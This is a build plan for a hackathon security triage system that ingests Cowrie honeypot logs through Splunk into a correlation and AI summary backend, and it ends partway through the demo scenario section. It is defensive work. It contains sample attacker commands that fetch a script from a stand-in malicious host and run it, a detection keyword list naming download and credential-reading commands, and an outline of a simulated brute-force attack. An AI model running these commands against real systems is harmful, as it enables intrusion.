# AEGIS — Complete Build Plan

## Goal

Build a hackathon-ready cybersecurity incident triage prototype that ingests **real attacker data** from a Cowrie SSH honeypot, pipes it through Splunk SIEM, and feeds it into the AEGIS detection and triage pipeline. The system correlates noisy alerts into explainable incidents, scores severity, and generates AI-powered investigation summaries. Everything runs on AWS.

**New (Phase 9):** AEGIS now integrates **[MemPalace](https://github.com/milla-jovovich/mempalace)** — the highest-scoring AI memory system ever benchmarked (96.6% LongMemEval, fully local, zero cloud calls). MemPalace gives AEGIS persistent memory across investigation sessions: attacker IP knowledge graphs, SOC analyst decision history, cross-session RCA pattern recall, and specialist agent diaries — so the AI gets smarter with every incident.

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                        INTERNET (ATTACKERS)                        │
└────────────────────────────────┬────────────────────────────────────┘
                                 │
                   SSH to port 2222 / Telnet 2223
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  EC2 #1: COWRIE HONEYPOT  (t3.micro, Ubuntu 22.04)                 │
│                                                                     │
│  Cowrie SSH/Telnet honeypot ──▶ JSON logs (/opt/cowrie/var/log/)    │
│  Splunk Universal Forwarder ──▶ ships logs to Splunk on port 9997  │
└────────────────────────────────┬────────────────────────────────────┘
                                 │
                         TCP 9997 (forwarder)
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  EC2 #2: SPLUNK SIEM  (t3.medium, Ubuntu 22.04)                    │
│                                                                     │
│  Splunk Enterprise (free trial, 500 MB/day)                        │
│  Index: "cowrie"                                                    │
│  Splunk Web UI on port 8000                                        │
│  REST API on port 8089                                              │
└────────────────────────────────┬────────────────────────────────────┘
                                 │
                   REST API poll every 30s (port 8089)
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  EC2 #3: AEGIS APP SERVER  (t3.large, Ubuntu 22.04)                │
│                                                                     │
│  Docker Compose:                                                    │
│    ├── FastAPI backend (port 8000)                                  │
│    ├── Python workers (normalize, correlate, summarize)             │
│    ├── PostgreSQL (port 5432)                                       │
│    ├── Redis (port 6379)                                            │
│    └── OpenSearch (port 9200) [optional]                            │
│                                                                     │
│  Splunk Bridge Script (polls Splunk → POSTs to AEGIS API)          │
│  React + Vite Frontend (port 5173)                                  │
│                                                                     │
│  MemPalace Memory Layer (NEW):                                      │
│    ├── ChromaDB (local vector store — verbatim memory)              │
│    ├── SQLite Knowledge Graph (attacker IP triples)                 │
│    ├── mempalace MCP server (19 tools for AI agents)                │
│    └── Palace: ~/.mempalace/aegis/ (wings per attacker/analyst)     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Phase 0 — AWS Infrastructure Setup (2–3 hours)

### 0.1 VPC and Networking

1. Create a VPC: `aegis-vpc`, CIDR `10.0.0.0/16`
2. Create 2 subnets:
   - `aegis-public-subnet` (10.0.1.0/24) — attach to Internet Gateway. For Cowrie and AEGIS App.
   - `aegis-private-subnet` (10.0.2.0/24) — For Splunk. Use NAT Gateway for outbound only.
   - **Simpler alternative**: Put all 3 in the public subnet with SG restrictions (faster for hackathon).
3. Create Internet Gateway, attach to VPC
4. Route table: public subnet → IGW

### 0.2 Security Groups

#### SG: `cowrie-honeypot-sg`

| Direction | Port | Source | Purpose |
|-----------|------|--------|---------|
| Inbound | 2222 | `0.0.0.0/0` | Fake SSH (honeypot) |
| Inbound | 2223 | `0.0.0.0/0` | Fake Telnet (optional) |
| Inbound | 22 | `YOUR_IP/32` | Admin SSH (real) |
| Outbound | 9997 | Splunk private IP | Forwarder data |
| Outbound | 443 | `0.0.0.0/0` | Updates |

#### SG: `splunk-siem-sg`

| Direction | Port | Source | Purpose |
|-----------|------|--------|---------|
| Inbound | 9997 | `cowrie-honeypot-sg` | Forwarder receive |
| Inbound | 8089 | `aegis-app-sg` | REST API |
| Inbound | 8000 | `YOUR_IP/32` | Splunk Web UI |
| Inbound | 22 | `YOUR_IP/32` | Admin SSH |

#### SG: `aegis-app-sg`

| Direction | Port | Source | Purpose |
|-----------|------|--------|---------|
| Inbound | 8000 | `0.0.0.0/0` or `YOUR_IP/32` | FastAPI (demo audience) |
| Inbound | 5173 | `0.0.0.0/0` or `YOUR_IP/32` | React frontend |
| Inbound | 22 | `YOUR_IP/32` | Admin SSH |

### 0.3 EC2 Instances

| Machine | AMI | Instance | Storage | Elastic IP? |
|---------|-----|----------|---------|-------------|
| Cowrie Honeypot | Ubuntu 22.04 | `t3.micro` | 8 GB gp3 | Yes (attackers need stable IP) |
| Splunk SIEM | Ubuntu 22.04 | `t3.medium` | 30 GB gp3 | No (internal only) |
| AEGIS App | Ubuntu 22.04 | `t3.large` | 30 GB gp3 | Yes (demo access) |

### 0.4 Key Pair

Create one key pair `aegis-key.pem` for all 3 instances. Download and secure it.

### 0.5 Budget Estimate (24-hour hackathon)

| Resource | ~Cost/24h |
|----------|-----------|
| t3.micro (Cowrie) | ~$0.25 (or free tier) |
| t3.medium (Splunk) | ~$1.00 |
| t3.large (AEGIS) | ~$2.00 |
| EBS storage | ~$0.30 |
| Data transfer | ~$0.50 |
| **Total** | **~$4.05** |

---

## Phase 1 — Cowrie Honeypot Setup (1–2 hours)

### 1.1 Install Cowrie on EC2 #1

SSH into the Cowrie EC2:

```bash
ssh -i aegis-key.pem ubuntu@<COWRIE_PUBLIC_IP>
```

Install dependencies:

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y git python3-venv python3-dev libssl-dev libffi-dev \
    build-essential python3-pip authbind
```

Create cowrie user and install:

```bash
sudo adduser --disabled-password --gecos "" cowrie
sudo su - cowrie

git clone https://github.com/cowrie/cowrie.git /opt/cowrie
cd /opt/cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
```

### 1.2 Configure Cowrie

```bash
cd /opt/cowrie
cp etc/cowrie.cfg.dist etc/cowrie.cfg
```

Edit `etc/cowrie.cfg` — key settings:

```ini
[honeypot]
hostname = svr04
# Fake hostname attackers see

[ssh]
enabled = true
listen_endpoints = tcp:2222:interface=0.0.0.0

[telnet]
enabled = true
listen_endpoints = tcp:2223:interface=0.0.0.0

[output_jsonlog]
enabled = true
logfile = ${honeypot:log_path}/cowrie.json
# This is the file that Splunk Universal Forwarder will monitor
```

### 1.3 Port Redirection (route port 22 to 2222)

To make the honeypot look like a real SSH server on port 22:

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2223
```

> [!WARNING]
> After this, your real admin SSH must use a **different port**. Before doing this, change your real SSH to port 22222:
> Edit `/etc/ssh/sshd_config`, set `Port 22222`, then `sudo systemctl restart sshd`. Update the security group to allow port 22222 from your IP.

### 1.4 Start Cowrie

```bash
cd /opt/cowrie
source cowrie-env/bin/activate
bin/cowrie start
```

Verify it's running:

```bash
tail -f /opt/cowrie/var/log/cowrie/cowrie.json
```

You should see JSON log lines when bots connect. On a public IP, expect first connections within **15–60 minutes**.

### 1.5 Install Splunk Universal Forwarder on Cowrie EC2

```bash
# Download Universal Forwarder (get latest from Splunk website)
wget -O splunkforwarder.deb 'https://download.splunk.com/products/universalforwarder/releases/9.3.2/linux/splunkforwarder-9.3.2-d8bb32809498-linux-amd64.deb'
sudo dpkg -i splunkforwarder.deb

# Start and accept license
sudo /opt/splunkforwarder/bin/splunk start --accept-license --answer-yes \
    --no-prompt --seed-passwd 'YourForwarderPass123!'

# Configure forwarding destination (Splunk EC2 private IP)
sudo /opt/splunkforwarder/bin/splunk add forward-server <SPLUNK_PRIVATE_IP>:9997

# Monitor the Cowrie JSON log
sudo /opt/splunkforwarder/bin/splunk add monitor /opt/cowrie/var/log/cowrie/cowrie.json \
    -index cowrie -sourcetype cowrie:json
```

### 1.6 Sample Cowrie JSON Events

What Cowrie produces (this is what flows into Splunk and ultimately AEGIS):

**Failed login:**
```json
{
  "eventid": "cowrie.login.failed",
  "timestamp": "2026-04-09T04:12:33.445123Z",
  "src_ip": "185.220.101.45",
  "src_port": 48392,
  "dst_ip": "10.0.1.10",
  "dst_port": 2222,
  "username": "root",
  "password": "admin123",
  "session": "a1b2c3d4e5f6",
  "sensor": "svr04",
  "protocol": "ssh"
}
```

**Successful login:**
```json
{
  "eventid": "cowrie.login.success",
  "timestamp": "2026-04-09T04:15:01.221456Z",
  "src_ip": "185.220.101.45",
  "src_port": 48392,
  "username": "root",
  "password": "root",
  "session": "a1b2c3d4e5f6",
  "sensor": "svr04",
  "protocol": "ssh"
}
```

**Command input:**
```json
{
  "eventid": "cowrie.command.input",
  "timestamp": "2026-04-09T04:15:18.773210Z",
  "src_ip": "185.220.101.45",
  "session": "a1b2c3d4e5f6",
  "input": "wget http://malicious.example.com/botnet.sh",
  "sensor": "svr04"
}
```

**File download:**
```json
{
  "eventid": "cowrie.session.file_download",
  "timestamp": "2026-04-09T04:15:22.990112Z",
  "src_ip": "185.220.101.45",
  "session": "a1b2c3d4e5f6",
  "url": "http://malicious.example.com/botnet.sh",
  "shasum": "e3b0c44298fc1c149afbf4c8996fb924...",
  "sensor": "svr04"
}
```

---

## Phase 2 — Splunk SIEM Setup (1–2 hours)

### 2.1 Install Splunk Enterprise on EC2 #2

SSH into the Splunk EC2:

```bash
ssh -i aegis-key.pem ubuntu@<SPLUNK_IP>
```

Install Splunk:

```bash
wget -O splunk.deb 'https://download.splunk.com/products/splunk/releases/9.3.2/linux/splunk-9.3.2-d8bb32809498-linux-amd64.deb'
sudo dpkg -i splunk.deb

sudo /opt/splunk/bin/splunk start --accept-license --answer-yes \
    --no-prompt --seed-passwd 'YourSplunkPass123!'

# Enable at boot
sudo /opt/splunk/bin/splunk enable boot-start
```

### 2.2 Configure Splunk Receiving

```bash
sudo /opt/splunk/bin/splunk enable listen 9997
```

### 2.3 Create Cowrie Index

Via Splunk Web (`http://<SPLUNK_IP>:8000`):

1. Go to **Settings → Indexes → New Index**
2. Name: `cowrie`
3. Max Size: `500 MB` (sufficient for hackathon)

Or via CLI:

```bash
sudo /opt/splunk/bin/splunk add index cowrie
```

### 2.4 Create Splunk Props/Transforms for Cowrie

Create `/opt/splunk/etc/system/local/props.conf`:

```ini
[cowrie:json]
INDEXED_EXTRACTIONS = json
TIME_FORMAT = %Y-%m-%dT%H:%M:%S.%6NZ
TIME_PREFIX = "timestamp"\s*:\s*"
MAX_TIMESTAMP_LOOKAHEAD = 32
SHOULD_LINEMERGE = false
LINE_BREAKER = ([\r\n]+)
KV_MODE = json
TRUNCATE = 10000
```

Restart Splunk:

```bash
sudo /opt/splunk/bin/splunk restart
```

### 2.5 Verify Data Flow

After Cowrie and Forwarder are running, search in Splunk Web:

```spl
index=cowrie sourcetype="cowrie:json" | head 20
```

You should see Cowrie events. If not, check forwarder logs on the Cowrie EC2:

```bash
sudo /opt/splunkforwarder/bin/splunk list forward-server
cat /opt/splunkforwarder/var/log/splunk/splunkd.log | tail -50
```

### 2.6 Create Saved Search for AEGIS Bridge

In Splunk, create a saved search (or the bridge will use ad-hoc search):

```spl
index=cowrie sourcetype="cowrie:json" earliest=-2m latest=now
| eval aegis_source_family="siem"
| eval aegis_source_type="cowrie_splunk"
| table _time, _raw, eventid, src_ip, src_port, dst_ip, dst_port,
        username, password, session, sensor, input, url, shasum, protocol
```

---

## Phase 3 — AEGIS Backend Build (6–8 hours)

### 3.1 Repository Scaffold

On the AEGIS App EC2 (or locally, then deploy):

```
aegis/
├── README.md
├── docker-compose.yml
├── .env.example
├── .gitignore
├── docs/
│   ├── api_examples.md
│   ├── demo_script.md
│   └── threat_mapping.md
├── mock-data/
│   ├── scenarios/
│   │   ├── account_compromise.json
│   │   ├── malware_execution.json
│   │   ├── reconnaissance_to_login.json
│   │   ├── exfiltration_chain.json
│   │   └── cowrie_brute_force_to_shell.json   ← NEW
│   └── reference/
│       ├── asset_inventory.json
│       ├── mitre_mappings.json
│       ├── severity_weights.json
│       └── cowrie_event_mappings.json          ← NEW
├── backend/
│   ├── pyproject.toml
│   ├── alembic.ini
│   ├── alembic/
│   ├── app/
│   │   ├── main.py
│   │   ├── core/
│   │   │   ├── config.py
│   │   │   ├── logging.py
│   │   │   ├── database.py
│   │   │   ├── redis.py
│   │   │   └── opensearch.py
│   │   ├── api/
│   │   │   ├── deps.py
│   │   │   ├── router.py
│   │   │   └── v1/
│   │   │       ├── alerts.py
│   │   │       ├── incidents.py
│   │   │       ├── dashboard.py
│   │   │       ├── scenarios.py
│   │   │       └── health.py
│   │   ├── models/           (SQLAlchemy ORM)
│   │   │   ├── raw_alert.py
│   │   │   ├── normalized_alert.py
│   │   │   ├── incident.py
│   │   │   ├── incident_alert_link.py
│   │   │   ├── correlation_match.py
│   │   │   ├── incident_summary.py
│   │   │   └── audit_log.py
│   │   ├── schemas/          (Pydantic v2)
│   │   │   ├── alert_ingest.py
│   │   │   ├── normalized_alert.py
│   │   │   ├── incident.py
│   │   │   ├── dashboard.py
│   │   │   └── summary.py
│   │   ├── services/
│   │   │   ├── adapters/
│   │   │   │   ├── base.py
│   │   │   │   ├── siem_adapter.py
│   │   │   │   ├── edr_adapter.py
│   │   │   │   ├── ids_adapter.py
│   │   │   │   └── cowrie_splunk_adapter.py    ← NEW
│   │   │   ├── ingestion_service.py
│   │   │   ├── normalization_service.py
│   │   │   ├── correlation_service.py
│   │   │   ├── scoring_service.py
│   │   │   ├── classification_service.py
│   │   │   ├── rca_service.py
│   │   │   ├── summary_service.py
│   │   │   ├── scenario_service.py
│   │   │   └── search_service.py
│   │   ├── rules/
│   │   │   ├── correlation_rules.py
│   │   │   ├── severity_rules.py
│   │   │   ├── classification_rules.py
│   │   │   └── mitre_attack_chains.py
│   │   ├── workers/
│   │   │   ├── queue.py
│   │   │   ├── normalize_worker.py
│   │   │   ├── correlate_worker.py
│   │   │   └── summary_worker.py
│   │   ├── utils/
│   │   │   ├── fingerprints.py
│   │   │   ├── datetime.py
│   │   │   └── json_schema.py
│   │   └── tests/
│   │       ├── test_ingest.py
│   │       ├── test_normalization.py
│   │       ├── test_correlation.py
│   │       ├── test_scoring.py
│   │       ├── test_cowrie_adapter.py          ← NEW
│   │       └── test_summary_validation.py
├── frontend/
│   ├── package.json
│   ├── vite.config.ts
│   ├── src/
│   │   ├── main.tsx
│   │   ├── App.tsx
│   │   ├── api/
│   │   ├── pages/
│   │   ├── components/
│   │   ├── store/
│   │   ├── types/
│   │   └── lib/
└── scripts/
    ├── splunk_bridge.py         ← NEW (polls Splunk, feeds AEGIS)
    ├── attack_simulator.py      ← NEW (scripted attacker for demo)
    ├── dev_seed.py
    ├── wait_for_services.sh
    └── reset_demo.sh
```

### 3.2 Docker Compose (`docker-compose.yml`)

```yaml
version: "3.9"
services:
  postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: aegis
      POSTGRES_USER: aegis
      POSTGRES_PASSWORD: aegis
    ports:
      - "5432:5432"
    volumes:
      - pgdata:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U aegis"]
      interval: 5s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 5s
      retries: 5

  opensearch:
    image: opensearchproject/opensearch:2.17.0
    environment:
      - discovery.type=single-node
      - plugins.security.disabled=true
      - "OPENSEARCH_JAVA_OPTS=-Xms512m -Xmx512m"
    ports:
      - "9200:9200"
    volumes:
      - osdata:/usr/share/opensearch/data
    healthcheck:
      test: ["CMD-SHELL", "curl -s http://localhost:9200 | grep -q 'cluster_name'"]
      interval: 10s
      timeout: 5s
      retries: 10

volumes:
  pgdata:
  osdata:
```

### 3.3 Backend Core — Step-by-Step Build Order

#### Step 1: FastAPI app skeleton + config

**`app/main.py`** — FastAPI app with CORS, lifespan (DB init), and router mounts.

**`app/core/config.py`** — Pydantic `Settings` class reading from `.env`:
- Database URL, Redis URL, OpenSearch URL
- OpenAI API key + model name
- Splunk connection settings (host, port, token) ← NEW
- Correlation thresholds, summary thresholds

**`app/core/database.py`** — SQLAlchemy async engine + session factory.

**`app/core/redis.py`** — Redis connection pool + queue publisher.

#### Step 2: Database models (SQLAlchemy)

Build all 6 tables as per the spec:

1. `raw_alerts` — immutable raw inbound JSON storage
2. `normalized_alerts` — canonical alerts, one-to-one with raw
3. `incidents` — primary incident record (severity, classification, status)
4. `incident_alert_links` — many-to-many (incident ↔ alert)
5. `correlation_matches` — explainability records (why alerts grouped)
6. `incident_summaries` — versioned AI/deterministic summaries
7. `audit_logs` — minimal audit trail

Run `alembic init` and generate migration from models.

#### Step 3: Pydantic schemas

- `AlertIngestRequest` — validates inbound `POST /api/v1/alerts/ingest`
- `NormalizedAlertResponse` — canonical alert output
- `IncidentResponse`, `IncidentDetailResponse` — incident list/detail
- `DashboardOverview`, `DashboardCharts` — dashboard data
- `SummaryResponse` — AI summary output

#### Step 4: Ingest API (`app/api/v1/alerts.py`)

- `POST /api/v1/alerts/ingest` — single alert
- `POST /api/v1/alerts/bulk` — bulk scenario/Splunk batch
- `GET /api/v1/alerts` — list with filters
- `GET /api/v1/alerts/{alert_id}` — single alert detail

Each ingest call: validate → store in `raw_alerts` → enqueue `normalize` job.

#### Step 5: Normalization adapters

**Base adapter interface (`services/adapters/base.py`):**

```python
class BaseAdapter:
    source_family: str
    source_type: str

    def normalize(self, raw_payload: dict) -> CanonicalAlert:
        raise NotImplementedError
```

**SIEM adapter** — handles `splunk_mock` events (failed_login, success_login, etc.)

**EDR adapter** — handles `crowdstrike_mock` events (process tree, priv esc, etc.)

**IDS adapter** — handles `suricata_mock` events (port scan, traffic spike, etc.)

**Cowrie-Splunk adapter (`cowrie_splunk_adapter.py`)** ← NEW:

Maps Cowrie event types to AEGIS canonical schema:

| Cowrie `eventid` | AEGIS `category` | AEGIS `event_name` | MITRE | Severity |
|---|---|---|---|---|
| `cowrie.session.connect` | `network` | `ssh_connection_attempt` | `T1046` | `low` |
| `cowrie.login.failed` | `authentication` | `failed_login` | `T1110` | `medium` |
| `cowrie.login.success` | `authentication` | `successful_login` | `T1078` | `high` |
| `cowrie.command.input` | `execution` | `command_execution` | `T1059` | `high` |
| `cowrie.command.failed` | `execution` | `command_execution_failed` | `T1059` | `medium` |
| `cowrie.session.file_download` | `execution` | `file_download` | `T1105` | `critical` |
| `cowrie.session.file_upload` | `execution` | `file_upload` | `T1105` | `high` |
| `cowrie.direct-tcpip.request` | `network` | `tunnel_request` | `T1572` | `high` |
| `cowrie.client.version` | `network` | `client_fingerprint` | — | `low` |

Adapter extracts: `src_ip`, `username`, `session` (as host correlation key), `sensor` (as host_name), commands, file hashes.

**Smart command analysis within Cowrie adapter:**

```python
HIGH_RISK_COMMANDS = [
    "wget", "curl", "tftp",           # download tools
    "chmod +x", "chmod 777",          # making files executable
    "/tmp/", "/dev/shm/",             # suspicious paths
    "base64", "python -c", "perl -e", # encoded execution
    "iptables", "ufw",                # firewall manipulation
    "passwd", "useradd", "usermod",   # account manipulation
    "cat /etc/passwd", "cat /etc/shadow",  # credential harvesting
    "nmap", "masscan",                # scanning from honeypot
    "rm -rf", "dd if=",              # destructive commands
]
```

If a `cowrie.command.input` event contains any high-risk command, bump `normalized_severity` to `high` or `critical` and add risk flags like `suspicious_download`, `credential_harvesting`, `lateral_movement_attempt`.

#### Step 6: Normalization worker (`workers/normalize_worker.py`)

- Dequeue from `queue:normalize`
- Load raw alert from DB
- Select adapter by `source_type`
- Run `adapter.normalize(raw_payload)`
- Compute entity fingerprint
- Persist `normalized_alerts` row
- Index into OpenSearch (if enabled)
- Enqueue `queue:correlate`

#### Step 7: Correlation engine (`services/correlation_service.py`)

This is the core intelligence. Exact logic from the spec:

1. Load open incidents (status `new` or `in_progress`, `last_seen_at` within 30 minutes)
2. For each candidate incident, compute correlation score:
   - `same_user` → +20 (or +8 for service accounts)
   - `same_host` → +15
   - `same_source_ip` → +15
   - `same_destination_ip` → +10
   - `time_within_5m` → +10
   - `time_within_15m` → +5
   - `mitre_overlap` → +12
   - `attack_chain_match` → +18
   - `high_value_asset_match` → +5
   - `duplicate_fingerprint_penalty` → -30
   - `contradictory_context_penalty` → -20
3. If score ≥ 30 → attach to best-scoring incident
4. If no candidate ≥ 30 → create new incident
5. Store reason codes in `correlation_matches`

**Cowrie-specific correlation boost:**
- Same `session` ID from Cowrie → treat as `same_host` + `same_user` (since it's the same attacker session). This is critical because Cowrie session IDs uniquely identify a single attacker interaction chain.

#### Step 8: Severity scoring (`services/scoring_service.py`)

Additive model, capped at 100:

```
base_signal_score (15–35 depending on type)
+ asset_criticality_bonus (+10/+15)
+ privileged_identity_bonus (+10)
+ multi_source_bonus (+8/+12)
+ execution_bonus (+10)
+ privilege_escalation_bonus (+20)
+ exfiltration_bonus (+15)
+ attack_chain_bonus (+10)
+ alert_volume_bonus (+5/+8)
- duplicate_noise_penalty (-10)
- benign_context_penalty (-15)

Clamp to 0..100
```

#### Step 9: Classification (`services/classification_service.py`)

6 incident types in precedence order:
1. `account_compromise` — failed login burst + success + post-auth activity
2. `malware_execution` — suspicious process tree, encoded commands, malicious hash
3. `privilege_escalation` — admin group change, token elevation
4. `possible_exfiltration` — outbound spike, suspicious external transfer
5. `brute_force_attempt` — repeated failed logins, no success
6. `reconnaissance` — port scan, service probing

#### Step 10: RCA bundle + AI summary

**`services/rca_service.py`** — builds deterministic structured bundle:
- incident metadata, entities, timeline, MITRE techniques
- observed facts, root cause hypothesis, recommended actions

**`services/summary_service.py`** — calls OpenAI GPT-4.5 API:
- System prompt: "You are a SOC investigation summarization assistant..."
- User prompt: structured bundle JSON
- Response validation: all required keys present, no hallucinated entities
- Fallback: template-based deterministic summary if LLM fails

#### Step 11: Incident + Dashboard APIs

- `GET /api/v1/incidents` — list/filter/paginate
- `GET /api/v1/incidents/{id}` — full detail with alerts, summary, explanation
- `PATCH /api/v1/incidents/{id}/status` — update status
- `POST /api/v1/incidents/{id}/recalculate` — re-run severity/classification
- `POST /api/v1/incidents/{id}/generate-summary` — trigger AI summary
- `GET /api/v1/dashboard/overview` — KPI metrics
- `GET /api/v1/dashboard/charts` — chart data
- `GET /api/v1/scenarios` — list available scenarios
- `POST /api/v1/scenarios/run/{name}` — trigger scenario

---

## Phase 4 — Splunk Bridge Script (1 hour)

### `scripts/splunk_bridge.py`

This Python script runs on the AEGIS App EC2 and continuously polls Splunk for new Cowrie events:

```python
"""
Splunk → AEGIS Bridge

Polls Splunk REST API for new Cowrie events and forwards them to AEGIS ingest API.
Runs as a long-lived process alongside the AEGIS backend.

Usage:
    python scripts/splunk_bridge.py

Environment variables:
    SPLUNK_HOST       - Splunk server (e.g., https://10.0.2.100:8089)
    SPLUNK_TOKEN      - Splunk Bearer token (or use SPLUNK_USER + SPLUNK_PASS)
    SPLUNK_USER       - Splunk username (default: admin)
    SPLUNK_PASS       - Splunk password
    AEGIS_API_URL     - AEGIS backend URL (default: http://localhost:8000)
    POLL_INTERVAL     - Seconds between polls (default: 30)
    SPLUNK_INDEX      - Index to query (default: cowrie)
"""

# Core loop:
# 1. Run Splunk search: index=cowrie earliest=-{POLL_INTERVAL}s latest=now
# 2. Parse results as JSON
# 3. For each Cowrie event:
#    - Wrap in AEGIS ingest format:
#      {
#        "source_family": "siem",
#        "source_type": "cowrie_splunk",
#        "external_alert_id": "<session>_<eventid>_<timestamp>",
#        "event_time": "<timestamp>",
#        "payload": { ...raw cowrie event... }
#      }
# 4. POST batch to /api/v1/alerts/bulk
# 5. Sleep POLL_INTERVAL seconds
# 6. Repeat
```

### Deduplication

The bridge tracks the last-seen timestamp to avoid re-ingesting events. Uses a simple **high-water mark** file or Redis key.

---

## Phase 5 — Attack Simulator Script (30 min)

### `scripts/attack_simulator.py`

For **guaranteed demo traffic** (in case real attackers haven't found the honeypot yet):

```python
"""
Controlled attacker script — runs against Cowrie honeypot to generate a full
attack chain for demo purposes.

Attack sequence:
  1. 15 failed SSH login attempts (brute force) with common username/password combos
  2. 1 successful login with root/root (Cowrie default credential)
  3. Run recon commands: whoami, id, uname -a, cat /etc/passwd
  4. Run download: wget http://example.com/botnet.sh
  5. Run execution: chmod +x /tmp/botnet.sh && /tmp/botnet.sh
  6. Disconnect

This produces ~20 Cowrie events that flow through Splunk into AEGIS,
creating a single Critical "account_compromise" incident.

Usage:
    python scripts/attack_simulator.py --target <COWRIE_PUBLIC_IP> --port 2222

Requires: pip install paramiko
"""
```

> [!TIP]
> Run the simulator from your **local machine** or from the AEGIS App EC2. It just makes SSH connections to the Cowrie EC2. The Cowrie honeypot catches and logs everything.

---

## Phase 6 — Frontend Build (4–6 hours)

### 6.1 Tech Stack

- React 18+ with TypeScript
- Vite for build tooling
- Tailwind CSS for styling
- Zustand for state management
- React Router for navigation
- Recharts for charts
- Axios for API calls

### 6.2 Pages to Build

#### Page 1: Dashboard (`/`)

```
┌──────────────────────────────────────────────────────────────┐
│  🛡️ AEGIS                          Dashboard | Incidents    │
├──────────┬───────────┬───────────┬───────────────────────────┤
│ Alerts   │ Open      │ Critical  │ Avg Alerts               │
│ Ingested │ Incidents │ Incidents │ per Incident              │
│   54     │    3      │    1      │   4.2                    │
├──────────┴───────────┴───────────┴───────────────────────────┤
│                                                              │
│  ┌─ Live Alert Feed ──────────┐  ┌─ Severity Distribution ─┐│
│  │ 🔴 Failed login root@svr04│  │  ████ Critical  1       ││
│  │ 🟡 SSH connect 185.x.x.x  │  │  ███░ High      1       ││
│  │ 🔴 cmd: wget malware.sh   │  │  ██░░ Medium    1       ││
│  │ 🟢 Port scan 10.0.1.x     │  │                         ││
│  └────────────────────────────┘  └─────────────────────────┘│
│                                                              │
│  ┌─ Alerts by Source ─────────┐  ┌─ Latest Incidents ──────┐│
│  │  SIEM  ████████ 20        │  │  INC-001  Critical  New ││
│  │  EDR   ██████   15        │  │  INC-002  High     New  ││
│  │  IDS   █████    12        │  │  INC-003  Medium   New  ││
│  └────────────────────────────┘  └─────────────────────────┘│
└──────────────────────────────────────────────────────────────┘
```

#### Page 2: Incidents List (`/incidents`)

- Filter bar: severity, status, type, user, host
- Sortable table: ID, Title, Type, Severity, Score, Alert Count, First/Last Seen, Status
- Row click → detail page

#### Page 3: Incident Detail (`/incidents/:id`)

```
┌──────────────────────────────────────────────────────────────┐
│  ← Back    INC-20260409-0001                                 │
│  Potential account compromise on svr04                       │
│  🔴 CRITICAL (85)  Confidence: 0.86  Status: [New ▼]       │
│  First: 04:12 UTC  |  Last: 04:16 UTC  |  5 alerts         │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─ AI Summary ───────────────────────────────────────────┐ │
│  │ Executive Summary: AEGIS correlated 5 Cowrie honeypot  │ │
│  │ events from attacker IP 185.220.101.45 into a likely   │ │
│  │ account compromise. The attacker brute-forced SSH,     │ │
│  │ gained root access, and attempted to download malware. │ │
│  │                                                        │ │
│  │ Root Cause: Credential brute-force followed by remote  │ │
│  │ code execution attempt via SSH honeypot.               │ │
│  │                                    [🔄 Regenerate]     │ │
│  └────────────────────────────────────────────────────────┘ │
│                                                              │
│  ┌─Observed Facts──────────┐ ┌─Next Steps─────────────────┐ │
│  │• 12 failed logins from  │ │• Block source IP           │ │
│  │  185.220.101.45         │ │• Review downloaded files    │ │
│  │• Successful root login  │ │• Check other hosts for     │ │
│  │  on attempt 13          │ │  same attacker IP          │ │
│  │• wget command executed  │ │• Report to threat intel    │ │
│  └─────────────────────────┘ └────────────────────────────┘ │
│                                                              │
│  ┌─ Timeline ────────────────────────────────────────────┐  │
│  │ 04:12  [SIEM] 12 failed SSH logins from 185.x.x.x    │  │
│  │ 04:15  [SIEM] Successful root login from 185.x.x.x   │  │
│  │ 04:15  [SIEM] Command: whoami, id, uname -a           │  │
│  │ 04:15  [SIEM] Command: wget http://malicious/bot.sh   │  │
│  │ 04:16  [SIEM] File download: bot.sh (sha: e3b0c4...)  │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                              │
│  ┌─ Correlation Explanation ─────────────────────────────┐  │
│  │ Score: 78                                             │  │
│  │ +20  same_user (root)                                 │  │
│  │ +15  same_source_ip (185.220.101.45)                  │  │
│  │ +15  same_host (svr04/session:a1b2c3)                 │  │
│  │ +10  time_within_5m                                   │  │
│  │ +18  attack_chain_match (brute_force→login→execution) │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                              │
│  ┌─ MITRE ATT&CK ───────────────────────────────────────┐  │
│  │ T1110 Brute Force  T1078 Valid Accounts               │  │
│  │ T1059 Command Interpreter  T1105 Ingress Tool Xfer    │  │
│  └───────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────┘
```

#### Page 4: Scenario Runner (`/scenarios`)

- Cards for each scenario (mock + live Cowrie)
- "Run Scenario" button
- "Run Attack Simulator" button ← NEW (triggers `attack_simulator.py`)
- "Reset Demo" button

### 6.3 UI Design

- **Dark theme** with strong severity colors:
  - Low = slate/gray
  - Medium = amber
  - High = orange
  - Critical = red
- Source badges: `SIEM` (blue), `EDR` (purple), `IDS` (green), `HONEYPOT` (amber) ← NEW badge for Cowrie-origin alerts
- Polls API every 5–10 seconds for live updates

---

## Phase 7 — Demo Scenarios & Data (1–2 hours)

### 7.1 Existing Mock Scenarios (keep as fallback)

| Scenario | Alerts | Expected Incidents | Severity |
|----------|--------|-------------------|----------|
| `account_compromise.json` | 5 | 1 | Critical |
| `malware_execution.json` | 3 | 1 | High |
| `reconnaissance_to_login.json` | 4 | 1–2 | High/Medium |
| `exfiltration_chain.json` | 3 | 1 | High |

### 7.2 New Cowrie Scenario

#### `cowrie_brute_force_to_shell.json`

Pre-recorded Cowrie events for offline/mock demo:

| # | Event | Time Offset | MITRE |
|---|-------|-------------|-------|
